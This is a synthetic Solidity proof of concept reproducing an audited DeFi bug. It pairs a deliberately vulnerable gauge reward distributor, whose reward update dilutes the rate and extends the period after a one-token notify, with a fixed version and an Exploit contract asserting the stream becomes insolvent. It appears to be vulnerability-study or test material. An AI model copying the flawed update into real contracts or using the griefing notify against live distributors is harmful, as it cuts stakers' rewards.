// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum GaugeRewardDistributor — a 1-token notify stretches the cycle
    (Pashov, 2025-05-06, H-01, finding 66163).
    SYNTHETIC, cheatcode-free. The else branch is the audited update.
    Leftover rewards are divided by a full DURATION and periodFinish jumps to
    the next cycle plus DURATION, so stakers earn less per second and the
    stream promises more than the contract holds. */

contract RewardToken {
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GaugeRewardDistributor {
    struct RewardData {
        uint256 rate;
        uint256 lastUpdateTime;
        uint256 periodFinish;
    }

    uint256 public constant DURATION = 7 days;
    RewardToken public token;
    RewardData public rd;
    uint256 public rateBefore;
    uint256 public leftoverBefore;

    constructor(RewardToken _token) {
        token = _token;
    }

    function getNextCycleStart() public view returns (uint256) {
        uint256 week = 7 days;
        return ((block.timestamp / week) + 1) * week;
    }

    function seedActiveCycle(uint256 rate, uint256 finish) external {
        rd.rate = rate;
        rd.periodFinish = finish;
        rd.lastUpdateTime = block.timestamp;
        uint256 leftover = (finish - block.timestamp) * rate;
        token.transferFrom(msg.sender, address(this), leftover);
    }

    function notifyRewardAmount(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        _handleRewardNotification(address(token), amount);
    }

    function _handleRewardNotification(address, uint256 amount) internal {
        uint256 timestamp = block.timestamp;
        if (timestamp >= rd.periodFinish) {
            rd.rate = amount / DURATION;
            rd.lastUpdateTime = getNextCycleStart();
            rd.periodFinish = rd.lastUpdateTime + DURATION;
        } else {
            uint256 remaining = rd.periodFinish - timestamp;
            uint256 leftover = remaining * rd.rate;
            rateBefore = rd.rate;
            leftoverBefore = leftover;
            rd.rate = (amount + leftover) / DURATION;
            rd.periodFinish = getNextCycleStart() + DURATION; // @> VULN: finish jumps to the next cycle plus a full duration, and the rate above was divided by DURATION rather than the time left
        }
    }
}

contract GaugeRewardDistributorFixed {
    struct RewardData {
        uint256 rate;
        uint256 periodFinish;
    }

    RewardToken public token;
    RewardData public rd;

    constructor(RewardToken _token) {
        token = _token;
    }

    function seedActiveCycle(uint256 rate, uint256 finish) external {
        rd.rate = rate;
        rd.periodFinish = finish;
        uint256 leftover = (finish - block.timestamp) * rate;
        token.transferFrom(msg.sender, address(this), leftover);
    }

    function notifyRewardAmount(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 timestamp = block.timestamp;
        uint256 remaining = rd.periodFinish - timestamp;
        uint256 leftover = remaining * rd.rate;
        rd.rate = (amount + leftover) / remaining;
    }
}

contract Exploit {
    RewardToken public token;
    GaugeRewardDistributor public dist;

    uint256 public oldRate;
    uint256 public newRate;
    uint256 public oldFinish;
    uint256 public newFinish;
    uint256 public windowPay;
    uint256 public obligation;
    uint256 public held;

    constructor() {
        token = new RewardToken();
        dist = new GaugeRewardDistributor(token);
        token.mint(address(this), (6 days * 1e18) + 1e18);
        token.approve(address(dist), type(uint256).max);
    }

    function run() external {
        oldFinish = block.timestamp + 6 days;
        dist.seedActiveCycle(1e18, oldFinish);
        oldRate = 1e18;

        dist.notifyRewardAmount(1e18);

        newRate = _rate();
        newFinish = _finish();
        windowPay = newRate * 6 days;
        held = token.balanceOf(address(dist));
        obligation = newRate * (newFinish - block.timestamp);

        require(newRate < oldRate, "rate not diluted");
        require(windowPay < oldRate * 6 days, "staker window not reduced");
        require(newFinish > oldFinish, "period not extended");
        require(obligation > held, "stream is solvent");
        require(dist.rateBefore() == oldRate, "snapshot");
    }

    function _rate() internal view returns (uint256 rate) {
        (rate,,) = dist.rd();
    }

    function _finish() internal view returns (uint256 finish) {
        (,, finish) = dist.rd();
    }
}
